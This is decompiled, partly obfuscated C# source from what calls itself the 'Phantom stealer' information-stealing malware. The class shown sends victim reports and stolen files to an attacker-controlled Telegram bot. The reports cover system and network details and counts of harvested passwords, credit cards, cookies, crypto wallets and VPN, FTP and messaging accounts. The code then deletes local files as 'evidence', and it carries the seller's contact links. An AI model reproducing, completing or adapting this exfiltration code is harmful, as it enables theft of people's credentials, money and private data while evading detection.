using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x020000BF RID: 191
	internal sealed class TelegramSendLogs
	{
		// Token: 0x060002D7 RID: 727 RVA: 0x0001AF48 File Offset: 0x00019148
		private static int GetMessageId(string response)
		{
			Match match = Regex.Match(response, "\"result\":{\"message_id\":\\d+");
			return int.Parse(match.Value.Replace("\"result\":{\"message_id\":", ""));
		}

		// Token: 0x060002D8 RID: 728 RVA: 0x0001AF80 File Offset: 0x00019180
		public static async Task<int> SendMessageAsync(string text)
		{
			try
			{
				using (HttpClient client = new HttpClient())
				{
					string requestUrl = string.Concat(new string[]
					{
						TelegramSendLogs.TelegramBotAPI,
						Config.TelegramAPI,
						"/sendMessage?chat_id=",
						Config.TelegramID,
						"&text=",
						Uri.EscapeDataString(text),
						"&parse_mode=Markdown&disable_web_page_preview=True"
					});
					TaskAwaiter<HttpResponseMessage> taskAwaiter = client.GetAsync(requestUrl).GetAwaiter();
					if (!taskAwaiter.IsCompleted)
					{
						await taskAwaiter;
						TaskAwaiter<HttpResponseMessage> taskAwaiter2;
						taskAwaiter = taskAwaiter2;
						taskAwaiter2 = default(TaskAwaiter<HttpResponseMessage>);
					}
					HttpResponseMessage httpResponseMessage = taskAwaiter.GetResult();
					HttpResponseMessage response = httpResponseMessage;
					httpResponseMessage = null;
					if (response.IsSuccessStatusCode)
					{
						TaskAwaiter<string> taskAwaiter3 = response.Content.ReadAsStringAsync().GetAwaiter();
						if (!taskAwaiter3.IsCompleted)
						{
							await taskAwaiter3;
							TaskAwaiter<string> taskAwaiter4;
							taskAwaiter3 = taskAwaiter4;
							taskAwaiter4 = default(TaskAwaiter<string>);
						}
						string text2 = taskAwaiter3.GetResult();
						string responseBody = text2;
						text2 = null;
						return TelegramSendLogs.GetMessageId(responseBody);
					}
					requestUrl = null;
					response = null;
				}
				HttpClient client = null;
			}
			catch (Exception error)
			{
				string text3 = "Telegram >> SendMessage exception:\n";
				Exception ex = error;
				Logging.Log(text3 + ((ex != null) ? ex.ToString() : null), true);
			}
			return 0;
		}

		// Token: 0x060002D9 RID: 729 RVA: 0x0001AFC4 File Offset: 0x000191C4
		public static async Task SendMessageInfoAsync()
		{
			string text = Config.Version;
			string text2 = SystemInfo.GetSystemVersion();
			string text3 = SystemInfo.Username;
			string text4 = SystemInfo.Compname;
			string text5 = Flags.GetFlag(SystemInfo.Culture.Split(new char[] { '-' })[1]);
			string text6 = SystemInfo.Culture;
			string text7 = SystemInfo.GetAntivirus();
			string text8 = SystemInfo.GetDefaultGateway();
			string text9 = SystemInfo.GetLocalIp();
			TaskAwaiter<string> taskAwaiter = SystemInfo.GetPublicIpAsync().GetAwaiter();
			if (!taskAwaiter.IsCompleted)
			{
				await taskAwaiter;
				TaskAwaiter<string> taskAwaiter2;
				taskAwaiter = taskAwaiter2;
				taskAwaiter2 = default(TaskAwaiter<string>);
			}
			string text10 = taskAwaiter.GetResult();
			string info = string.Concat(new string[]
			{
				"```\n\ud83d\ude39 *Phantom stealer ",
				text,
				" - Report:*\n━━━━━━━━━━━━━━━━━━━━━━\n\ud83d\udcc5 Date: ",
				SystemInfo.Datenow,
				"\n\ud83d\udda5\ufe0f System: ",
				text2,
				"\n\ud83d\udc64 Username: ",
				text3,
				"\n\ud83d\udcbb CompName: ",
				text4,
				"\n\ud83c\udf10 Language: ",
				text5,
				" ",
				text6,
				"\n\ud83d\udee1\ufe0f Antivirus: ",
				text7,
				"\n\n*NETWORK INFORMATION*\n━━━━━━━━━━━━━━━━━━━━━━\n\ud83c\udf10 Gateway IP: ",
				text8,
				"\n\ud83d\udd12 Internal IP: ",
				text9,
				"\n\ud83c\udf0d External IP: ",
				text10,
				"\n\n*BROWSER RECOVERIES*\n━━━━━━━━━━━━━━━━━━━━━━",
				Counter.GetIValue("\ud83d\udd11 Passwords", Counter.Passwords),
				Counter.GetIValue("\ud83d\udcb3 Credit Cards", Counter.CreditCards),
				Counter.GetIValue("\ud83c\udf6a Cookies", Counter.Cookies),
				Counter.GetIValue("\ud83d\udc5b Wallet Extensions", Counter.BrowserWallets),
				"\n\n*SOFTWARE & ACCOUNTS*\n━━━━━━━━━━━━━━━━━━━━━━",
				Counter.GetIValue("\ud83d\udcb0 Crypto Wallets", Counter.DesktopWallets),
				Counter.GetIValue("\ud83d\udd0c FTP Hosts", Counter.FtpHosts),
				Counter.GetIValue("\ud83d\udd12 VPN Accounts", Counter.Vpn),
				Counter.GetSValue("\ud83d\udce7 Outlook", Counter.Outlook),
				Counter.GetSValue("\ud83d\udce7 FoxMail", Counter.FoxMail),
				Counter.GetSValue("✈\ufe0f Telegram", Counter.Telegram),
				Counter.GetSValue("\ud83d\udc7e Discord", Counter.Discord),
				Counter.GetSValue("\ud83d\udcac WinScp", Counter.WinScp),
				"\n\n*Grabbed Files*\n━━━━━━━━━━━━━━━━━━━━━━",
				Counter.GetIValue("\ud83d\udcb3 Images", Counter.GrabberImages),
				Counter.GetIValue("\ud83d\udcac Documents", Counter.GrabberDocuments),
				Counter.GetIValue("\ud83d\udda5\ufe0f Databases", Counter.GrabberDatabases),
				Counter.GetIValue("\ud83d\udd0c SourceCodes", Counter.GrabberSourceCodes),
				Counter.GetIValue("\ud83d\udcb0 Crypto Wallets", Counter.DesktopWallets),
				Counter.GetIValue("\ud83d\udc5b Wallet Extensions", Counter.BrowserWallets),
				Counter.GetSValue("✈\ufe0f Telegram", Counter.Telegram),
				"\n\n*DEVICE INFORMATION*\n━━━━━━━━━━━━━━━━━━━━━━",
				Counter.GetIValue("\ud83d\udce1 WiFi Networks", Counter.SavedWifiNetworks),
				"\n\n*INSTALLATION STATUS*\n━━━━━━━━━━━━━━━━━━━━━━",
				Counter.GetBValue(Config.Startup == "1", "✅ Startup: Enabled", "⛔ Startup: Disabled"),
				Counter.GetBValue(Config.Debug == "1", "✅ Debug Mode: Enabled", "⛔ Debug Mode: Disabled"),
				Counter.GetBValue(Config.AntiAnalysis == "1", "✅ AntiAnalysis: Enabled", "⛔ AntiAnalysis: Disabled"),
				Counter.GetBValue(Config.Keylogger == "1", "✅ Keylogger: Enabled", "⛔ Keylogger: Disabled"),
				Counter.GetBValue(Config.Screenshot == "1", "✅ Screenshot: Enabled", "⛔ Screenshot: Disabled"),
				Counter.GetBValue(Config.ClipperCheckBox == "1", "✅ CryptoClipper: Enabled", "⛔ CryptoClipper: Disabled"),
				Counter.GetBValue(Config.FileGrabberCheckBox == "1", "✅ FileGrabber: Enabled", "⛔ FileGrabber: Disabled"),
				"\n\n Telegram contact https://t.me/Oldphantomoftheopera\n\n website https://www.phantomsoftwares.site/home```"
			});
			text = null;
			text2 = null;
			text3 = null;
			text4 = null;
			text5 = null;
			text6 = null;
			text7 = null;
			text8 = null;
			text9 = null;
			text10 = null;
			TaskAwaiter<int> taskAwaiter3 = TelegramSendLogs.SendMessageAsync(info).GetAwaiter();
			if (!taskAwaiter3.IsCompleted)
			{
				await taskAwaiter3;
				TaskAwaiter<int> taskAwaiter4;
				taskAwaiter3 = taskAwaiter4;
				taskAwaiter4 = default(TaskAwaiter<int>);
			}
			taskAwaiter3.GetResult();
		}

		// Token: 0x060002DA RID: 730 RVA: 0x0001B004 File Offset: 0x00019204
		public static async Task SendReportAsync(string file = null)
		{
			Logging.Log("Uploading logs to Telegram", true);
			TaskAwaiter<List<string>> taskAwaiter = UploadToTelegram.UploadMultipleFilesAsync(null).GetAwaiter();
			if (!taskAwaiter.IsCompleted)
			{
				await taskAwaiter;
				TaskAwaiter<List<string>> taskAwaiter2;
				taskAwaiter = taskAwaiter2;
				taskAwaiter2 = default(TaskAwaiter<List<string>>);
			}
			List<string> list = taskAwaiter.GetResult();
			List<string> uploadResponses = list;
			list = null;
			foreach (string response in uploadResponses)
			{
				Logging.Log(response, true);
				response = null;
			}
			List<string>.Enumerator enumerator = default(List<string>.Enumerator);
			string workDir = Paths.InitWorkDir();
			string[] filesToDelete = (from f in Directory.GetFiles(workDir)
				where new string[] { ".txt", ".png", ".json" }.Contains(Path.GetExtension(f).ToLower())
				select f).ToArray<string>();
			foreach (string fileToDelete in filesToDelete)
			{
				try
				{
					Logging.Log("Upload Complete, deleting any evidence", true);
					File.Delete(fileToDelete);
					Logging.Log("Deleted: " + fileToDelete, true);
				}
				catch (Exception ex)
				{
					Logging.Log("Failed to delete " + fileToDelete + ": " + ex.Message, true);
				}
				fileToDelete = null;
			}
			string[] array = null;
			Logging.Log("Sending Log summary to telegram", true);
			TaskAwaiter taskAwaiter3 = TelegramSendLogs.SendMessageInfoAsync().GetAwaiter();
			if (!taskAwaiter3.IsCompleted)
			{
				await taskAwaiter3;
				TaskAwaiter taskAwaiter4;
				taskAwaiter3 = taskAwaiter4;
				taskAwaiter4 = default(TaskAwaiter);
			}
			taskAwaiter3.GetResult();
			Logging.Log("Summary Successfully Sent", true);
		}

		// Token: 0x060002DB RID: 731 RVA: 0x000038B4 File Offset: 0x00001AB4
		public TelegramSendLogs()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			base..ctor();
		}

		// Token: 0x060002DC RID: 732 RVA: 0x00004106 File Offset: 0x00002306
		static TelegramSendLogs()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			TelegramSendLogs.TelegramBotAPI = StringsCrypt.DecryptConfig("ENCRYPTED:BncRbgTGet4L+mKqD8dz7h8EdEcrI2Pbm5InYO5Ff/I=");
		}

		// Token: 0x04000585 RID: 1413
		private static string TelegramBotAPI;
	}
}
